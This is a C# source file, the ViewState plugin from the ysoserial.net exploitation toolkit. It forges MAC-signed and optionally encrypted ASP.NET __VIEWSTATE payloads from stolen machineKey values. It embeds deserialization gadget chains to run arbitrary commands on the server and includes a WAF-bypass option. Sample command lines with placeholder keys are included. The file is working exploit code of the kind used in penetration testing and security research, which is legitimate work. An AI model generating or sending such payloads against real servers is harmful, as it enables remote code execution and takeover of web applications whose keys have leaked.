using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Configuration;
using ysoserial.Generators;
using ysoserial.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This is used when the MachineKey parameters have been stolen for example by downloading the web.config or machine.config file via another vulnerability
 *  This is not going to be useful when web.config sensitive parameters have been properly encrypted or when "AutoGenerate" has been used
 *  Also see https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/ for more details
 *  
 *  Kudos to Alvaro Muñoz for the support
 **/

namespace ysoserial.Plugins
{
    public class ViewStatePlugin : IPlugin
    {
        static bool showExamples = false;
        static bool showraw = false;
        static bool dryRun = false;
        static bool minify = false;
        static bool useSimpleType = true;
        static bool isDebug = false;
        static string gadget = "ActivitySurrogateSelector";
        static string command = "";
        static bool cmdstdin = false;
        static string unsignedPayload = "";

        static bool isLegacy = false;
        static string viewstateGenerator = "";
        static string targetPagePath = "";
        static string IISAppInPathOrVirtualDir = "";
        static string viewStateUserKey = null;
        static bool isEncrypted = false;
        static string decryptionAlg = "AES";
        static string decryptionKey = "";
        static string validationAlg = "HMACSHA256";
        static string validationKey = "";


        Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        
        string formatter = "losformatter";
        string payloadString = "";
        string shortestViewStateString = "/wEPZGQ="; // not in use at the moment but good to know!!!
        string dryRunViewStateString = "/wEPDwUKMDAwMDAwMDAwMGRk"; // dryrun is currently disabled until we find a meaningful method to use the errors

        static OptionSet options = new OptionSet()
            {
                {"examples", "to show a few examples. Other parameters will be ignored", v => showExamples = v != null },
                /*{"dryrun", "to create a valid ViewState without using an exploit payload. The gadget and command parameters will be ignored", v => dryRun = v != null },*/
                {"g|gadget=", "a gadget chain that supports LosFormatter. Default: ActivitySurrogateSelector", v => gadget = v },
                {"c|command=", "the command suitable for the used gadget (will be ignored for ActivitySurrogateSelector)", v => command = v },
                {"s|stdin", "The command to be executed will be read from standard input.", v => cmdstdin = v != null },
                {"upayload=", "the unsigned LosFormatter payload in (base64 encoded). The gadget and command parameters will be ignored", v => unsignedPayload = v },
                { "generator=", "the __VIEWSTATEGENERATOR value which is in HEX, useful for .NET <= 4.0. When not empty, 'legacy' will be used and 'path' and 'apppath' will be ignored.", v => viewstateGenerator = v},
                {"path=", "the target web page. example: /app/folder1/page.aspx", v => targetPagePath = v},
                {"apppath=", "the application path. this is needed in order to simulate TemplateSourceDirectory", v => IISAppInPathOrVirtualDir = v},
                {"islegacy", "when provided, it uses the legacy algorithm suitable for .NET 4.0 and below", v => isLegacy = v != null},
                {"isencrypted", "this will be used when the legacy algorithm is used to bypass WAFs", v => isEncrypted = v!= null},
                {"viewstateuserkey=", "this to set the ViewStateUserKey parameter that sometimes used as the anti-CSRF token", v => viewStateUserKey = v},
                {"decryptionalg=", "the encryption algorithm can be set to  DES, 3DES, AES. Default: AES", v => decryptionAlg = v},
                {"decryptionkey=", "this is the decryptionKey attribute from machineKey in the web.config file", v => decryptionKey = v},
                {"validationalg=", "the validation algorithm can be set to SHA1, HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES, AES. Default: HMACSHA256", v => validationAlg = v},
                {"validationkey=", "this is the validationKey attribute from machineKey in the web.config file", v => validationKey = v},
                {"showraw", "to stop URL-encoding the result. Default: false", v => showraw = v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
                {"isdebug", "to show useful debugging messages!", v => isDebug = v != null },
            };

        public string Name()
        {
            return "ViewState";
        }

        public string Description()
        {
            return "Generates a ViewState using known MachineKey parameters";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                if (String.IsNullOrEmpty(command) && cmdstdin)
                {
                    inputArgs.Cmd = Console.ReadLine();
                } else {
                    inputArgs.Cmd = command;
                }
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
            }
            catch (OptionException e)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                ShowExamples();
                System.Environment.Exit(-1);
            }

            if (showExamples)
            {
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                ShowExamples();
                System.Environment.Exit(-1);
            }

            if (String.IsNullOrEmpty(command) && !dryRun && !cmdstdin)
            {
                Console.Write("ysoserial: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
                ShowExamples();
                System.Environment.Exit(-1);
            }

            var types = AppDomain.CurrentDomain.GetAssemblies().SelectMany(s => s.GetTypes());

            // Populate list of available gadgets
            var generatorTypes = types.Where(p => typeof(IGenerator).IsAssignableFrom(p) && !p.IsInterface);
            var generators = generatorTypes.Select(x => x.Name.Replace("Generator", "")).ToList();

            uint parsedViewstateGeneratorIdentifier = 0;
            if (!String.IsNullOrEmpty(viewstateGenerator))
            {
                // Converting "__VIEWSTATEGENERATOR" from HEX to INT
                if (UInt32.TryParse(viewstateGenerator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out parsedViewstateGeneratorIdentifier))
                {
                    // A valid "__VIEWSTATEGENERATOR" was provided!
                    isLegacy = true;
                }
                else
                {
                    Console.WriteLine("Invalid generator parameter. It needs to be in Hex format. Example: 955733D9");
                    System.Environment.Exit(-1);
                }
            }

            if (dryRun)
            {
                if (isDebug)
                {
                    Console.WriteLine("dryRun mode, using the minimum payload without any exploit");
                }
                payloadString = dryRunViewStateString;
            }
            else if (!String.IsNullOrEmpty(unsignedPayload))
            {
                payloadString = unsignedPayload;
            }
            else
            {
                if (!generators.Contains(gadget))
                {
                    Console.WriteLine("Gadget not supported.");
                    System.Environment.Exit(-1);
                }

                // Instantiate Payload Generator
                IGenerator generator = null;
                try
                {
                    var container = Activator.CreateInstance(null, "ysoserial.Generators." + gadget + "Generator");
                    generator = (IGenerator)container.Unwrap();
                }
                catch
                {
                    Console.WriteLine("Gadget not supported!");
                    System.Environment.Exit(-1);
                }

                // Check Generator supports specified formatter
                if (generator.IsSupported(formatter))
                {
                    payloadString = System.Text.Encoding.ASCII.GetString((byte[])generator.GenerateWithNoTest(formatter, inputArgs));
                }
                else
                {
                    Console.WriteLine("LosFormatter not supported.");
                    System.Environment.Exit(-1);
                }
            }

            if (isDebug)
            {
                if (viewStateUserKey != null)
                {
                    if (viewStateUserKey.Equals(""))
                        Console.WriteLine("viewStateUserKey is EMPTY not NULL. It will be used in MAC calculation");
                }
            }

            byte[] payload = System.Convert.FromBase64String(payloadString);

            // we are settign the given machineKey parameters dynamically in this application to make the process easier
            // thanks to stackoverflow #18446385 for the tips!
            object[] emptyArray = new object[] { };

            var machineKeySectionType = systemWebAsm.GetType("System.Web.Configuration.MachineKeySection");
            var getApplicationConfigMethod = machineKeySectionType.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
            var config = (MachineKeySection)getApplicationConfigMethod.Invoke(null, emptyArray);
            var section = (MachineKeySection)ConfigurationManager.GetSection("system.web/machinekey"); //interesting
            var readOnlyField = typeof(ConfigurationElement).GetField("_bReadOnly", BindingFlags.Instance | BindingFlags.NonPublic);
            readOnlyField.SetValue(config, false);
            // we don't really need the encryption/decyption keys to create a valid legacy viewstate but this is used when isEncrypted=true
            if (!String.IsNullOrEmpty(decryptionKey) && (!isLegacy || (isLegacy && isEncrypted)))
            {
                if (isDebug)
                {
                    Console.WriteLine("Encryption is on!");
                }
                config.Decryption = decryptionAlg;
                config.DecryptionKey = decryptionKey;
            }
            if (validationAlg.ToUpper().Equals("3DES"))
            {
                // If validationAlg is 3DES, modify it to TripleDES in order for Enum.Parse to work.
                validationAlg = "TripleDES";
            }
            config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);

            if (validationKey.EndsWith(",IsolateApps")) {
                validationKey = validationKey.Substring(0, validationKey.Length - ",IsolateApps".Length);

                var hexStringToByteArray = typeof(MachineKeySection).GetMethod("HexStringToByteArray", BindingFlags.Static | BindingFlags.NonPublic);
                byte[] key = (byte[])hexStringToByteArray.Invoke(null, new object[] { validationKey });
                int dwCode;

                if (isLegacy)
                {
                    // seems the result it's same as following code (without --legacy) but i don't know why :)
                    dwCode = (int)StringComparer.InvariantCultureIgnoreCase.GetHashCode(IISAppInPathOrVirtualDir);
                }
                else
                {
                    var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
                    var nonRandomizedStringComparerHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedStringComparerHashCode", BindingFlags.Static | BindingFlags.NonPublic);
                     
                    dwCode = (int)nonRandomizedStringComparerHashCodeMethod.Invoke(null, new object[] { IISAppInPathOrVirtualDir });
                }

                key[0] = (byte)(dwCode & 0xff);
                key[1] = (byte)((dwCode & 0xff00) >> 8);
                key[2] = (byte)((dwCode & 0xff0000) >> 16);
                key[3] = (byte)((dwCode & 0xff000000) >> 24);
                
                StringBuilder hex = new StringBuilder(key.Length * 2);
                foreach (byte b in key)
                    hex.AppendFormat("{0:X2}", b);
                validationKey = hex.ToString();
                if (isDebug)
                {
                    Console.WriteLine("Calculated new ValidationKey: " + validationKey);
                }

            }

            config.ValidationKey = validationKey;

            readOnlyField.SetValue(config, true);

            object finalPayload;

            if (isLegacy)
            {
                finalPayload = generateViewStateLegacy_2_to_4(targetPagePath, parsedViewstateGeneratorIdentifier, IISAppInPathOrVirtualDir, isEncrypted, viewStateUserKey, payload);
            }
            else
            {
                finalPayload = generateViewState_4dot5(targetPagePath, IISAppInPathOrVirtualDir, viewStateUserKey, payload);
            }

            return finalPayload;
        }

        private object generateViewStateLegacy_2_to_4(string targetPagePath, uint parsedViewstateGeneratorIdentifier, string IISAppInPath, bool isEncrypted, string viewStateUserKey, byte[] payload)
        {
            var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
            var nonRandomizedHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedHashCode", BindingFlags.Static | BindingFlags.NonPublic);

            // the pageHashCode is equal to integer conversaion of the "__VIEWSTATEGENERATOR" which is in hex
            // so we don't need to calculate pageHashCode if the "__VIEWSTATEGENERATOR" parameter is known for a page
            // it will be 0 if nothing has been provided. Hopefully there is no page with "__VIEWSTATEGENERATOR == 00000000"!!!
            uint pageHashCode = parsedViewstateGeneratorIdentifier;

            if (pageHashCode == 0)
            {
                // from GetMacKeyModifier() of System.Web.UI.ObjectStateFormatter
                // This is where the path is important
                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
                pageHashCode = (uint)pageHashCodeTemp;

                if (isDebug)
                {
                    Console.WriteLine("Calculated pageHashCode in uint: " + (uint)pageHashCode);
                    Console.WriteLine("Calculated __VIEWSTATEGENERATOR (ignored): " + pageHashCode.ToString("X8", CultureInfo.InvariantCulture));
                }
            }
            else if (isDebug)
            {
                // this just for debugging to ensure the __VIEWSTATEGENERATOR matches the calculation
                // this can also be used to identify the correct path and apppath parameters using trial and error
                Console.WriteLine("Provided __VIEWSTATEGENERATOR in uint: " + parsedViewstateGeneratorIdentifier);
                int pageHashCodeTemp = (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateTemplateSourceDirectory(targetPagePath), true });
                pageHashCodeTemp += (int)nonRandomizedHashCodeMethod.Invoke(null, new object[] { simulateGetTypeName(targetPagePath, IISAppInPath), true });
                Console.WriteLine("Calculated pageHashCode in uint (ignored): " + (uint)pageHashCodeTemp);
            }

            var _macKeyBytes = new byte[4];

            // viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
            if (viewStateUserKey != null)
            {
                int count = Encoding.Unicode.GetByteCount(viewStateUserKey);
                _macKeyBytes = new byte[count + 4];
                Encoding.Unicode.GetBytes(viewStateUserKey, 0, viewStateUserKey.Length, _macKeyBytes, 4);
            }
            _macKeyBytes[0] = (byte)pageHashCode;
            _macKeyBytes[1] = (byte)(pageHashCode >> 8);
            _macKeyBytes[2] = (byte)(pageHashCode >> 16);
            _macKeyBytes[3] = (byte)(pageHashCode >> 24);


            byte[] byteResult;
            if (!isEncrypted)
            {
                var getterGetEncodedData = typeof(MachineKeySection).GetMethod("GetEncodedData", BindingFlags.Static | BindingFlags.NonPublic);
                byteResult = (byte[])getterGetEncodedData.Invoke(null, new object[] { payload, _macKeyBytes, 0, payload.Length });
            }
            else
            {
                var getterEncryptOrDecryptData = typeof(MachineKeySection).GetMethod("EncryptOrDecryptData", BindingFlags.Static | BindingFlags.NonPublic, null,
                new Type[] { typeof(bool), typeof(byte[]), typeof(byte[]), typeof(int), typeof(int) }, null);
                byteResult = (byte[])getterEncryptOrDecryptData.Invoke(null, new object[] { true, payload, _macKeyBytes, 0, payload.Length });
            }

            string outputBase64 = System.Convert.ToBase64String(byteResult);
            if (!showraw)
                outputBase64 = Uri.EscapeDataString(outputBase64);
            return outputBase64;
        }

        private object generateViewState_4dot5(string targetPagePath, string IISAppInPath, string viewStateUserKey, byte[] payload)
        {
            var purposeType = systemWebAsm.GetType("System.Web.Security.Cryptography.Purpose");
            object[] parameters = new object[2];
            string mainPurpose = "WebForms.HiddenFieldPageStatePersister.ClientState";
            // list of useful main purposes:
            // for "__VIEWSTATE": "WebForms.HiddenFieldPageStatePersister.ClientState"
            // for "__EVENTVALIDATION": "WebForms.ClientScriptManager.EventValidation"
            // for P2 in P1|P2 in "__dv" + ClientID + "__hidden": "WebForms.DetailsView.KeyTable"
            // for P4 in P1|P2|P3|P4 in "__CALLBACKPARAM": "WebForms.DetailsView.KeyTable"
            // for P3 in P1|P2|P3|P4 in "__gv" + ClientID + "__hidden": "WebForms.GridView.SortExpression"
            // for P4 in P1|P2|P3|P4 in "__gv" + ClientID + "__hidden": "WebForms.GridView.DataKeys"
            parameters[0] = mainPurpose;

            // This is where the path is important
            string[] specificPurposes = new String[] {
                    "TemplateSourceDirectory: " + simulateTemplateSourceDirectory(targetPagePath).ToUpperInvariant(),
                    "Type: " + simulateGetTypeName(targetPagePath, IISAppInPath).ToUpperInvariant()
                };

            // viewStateUserKey is normally the anti-CSRF parameter unless it is the same for all users! 
            if (viewStateUserKey != null)
            {
                Array.Resize(ref specificPurposes, specificPurposes.Length + 1);
                specificPurposes[specificPurposes.Length - 1] = "ViewStateUserKey: " + viewStateUserKey;
            }
            parameters[1] = specificPurposes;

            object purpose = Activator.CreateInstance(purposeType, parameters);
            var aspNetCryptoServiceProviderType = systemWebAsm.GetType("System.Web.Security.Cryptography.AspNetCryptoServiceProvider");
            var getterInstance = aspNetCryptoServiceProviderType.GetProperty("Instance", BindingFlags.Static | BindingFlags.NonPublic);
            var objectAspNetCryptoServiceProvider = getterInstance.GetValue(aspNetCryptoServiceProviderType, null);
            var methodGetCryptoService = objectAspNetCryptoServiceProvider.GetType().GetMethod("GetCryptoService");
            var cryptoServiceClass = methodGetCryptoService.Invoke(objectAspNetCryptoServiceProvider, new object[] { purpose, 0 });
            var protectMethod = cryptoServiceClass.GetType().GetMethod("Protect");
            byte[] byteResult = (byte[])protectMethod.Invoke(cryptoServiceClass, new object[] { payload });

            string outputBase64 = System.Convert.ToBase64String(byteResult);
            if (!showraw)
                outputBase64 = Uri.EscapeDataString(outputBase64);
            return outputBase64;
        }

        private String simulateTemplateSourceDirectory(String strPath)
        {

            if (!strPath.StartsWith("/"))
                strPath = "/" + strPath;

            String result = strPath;
            
            if (result.LastIndexOf(".") > result.LastIndexOf("/"))
            {
                // file name needs to be removed
                result = result.Substring(0, result.LastIndexOf("/") + 1);
            }
            result = RemoveSlashFromPathIfNeeded(result);

            if (isDebug)
                Console.WriteLine("simulateTemplateSourceDirectory returns: " + result);

            return result;
        }

        private String simulateGetTypeName(String strPath, String IISAppInPath)
        {

            if (!strPath.StartsWith("/"))
                strPath = "/" + strPath;

            String result = strPath;

            if (!result.ToLower().EndsWith(".aspx"))
                result += "/default.aspx";

            IISAppInPath = IISAppInPath.ToLower();
            if (!IISAppInPath.StartsWith("/"))
                IISAppInPath = "/" + IISAppInPath;
            if (!IISAppInPath.EndsWith("/"))
                IISAppInPath += "/";

            if (result.ToLower().IndexOf(IISAppInPath) >= 0)
                result = result.Substring(result.ToLower().IndexOf(IISAppInPath) + IISAppInPath.Length);

            // to get rid of the first /
            if (result.StartsWith("/"))
                result = result.Substring(1);

            result = result.Replace(".", "_").Replace("/", "_");

            result = RemoveSlashFromPathIfNeeded(result);

            if (isDebug)
                Console.WriteLine("simulateGetTypeName returns: " + result);

            return result;
        }

        private string CanonThePath(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                return null;
            }
            Regex regexBackSlash = new Regex("\\\\");
            Regex regexDoubleSlash = new Regex("[/]+");
            path = regexBackSlash.Replace(path, "/");
            path = regexDoubleSlash.Replace(path, "/");
            return path;
        }

        private string RemoveSlashFromPathIfNeeded(string path)
        {
            if (string.IsNullOrEmpty(path))
            {
                return null;
            }
            int l = path.Length;
            if (l <= 1 || path[l - 1] != '/')
            {
                return path;
            }

            return path.Substring(0, l - 1);
        }

        // from https://lonewolfonline.net/replace-first-occurrence-string/ :
        private string ReplaceFirstOccurrence(string Source, string Find, string Replace)
        {
            int Place = Source.IndexOf(Find);
            string result = Source.Remove(Place, Find.Length).Insert(Place, Replace);
            return result;
        }

        private string ReplaceLastOccurrence(string Source, string Find, string Replace)
        {
            int Place = Source.LastIndexOf(Find);
            string result = Source.Remove(Place, Find.Length).Insert(Place, Replace);
            return result;
        }

        private void ShowExamples()
        {
            string examples = @"
.NET Framework >= 4.5:
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ""echo 123 > c:\windows\temp\test.txt"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --validationalg=""HMACSHA256"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""

.NET Framework <= 4.0 (legacy):
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ""echo 123 > c:\windows\temp\test.txt"" --apppath=""/testaspx/"" --islegacy --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"" --isdebug

.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ""echo 123 > c:\windows\temp\test.txt"" --generator=93D20A1B --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""

.\ysoserial.exe -p ViewState -c ""foo to use ActivitySurrogateSelector"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --islegacy --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --isencrypted --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""
";

            Console.WriteLine("Exmaples:");
            Console.WriteLine(examples);
        }
    }
}
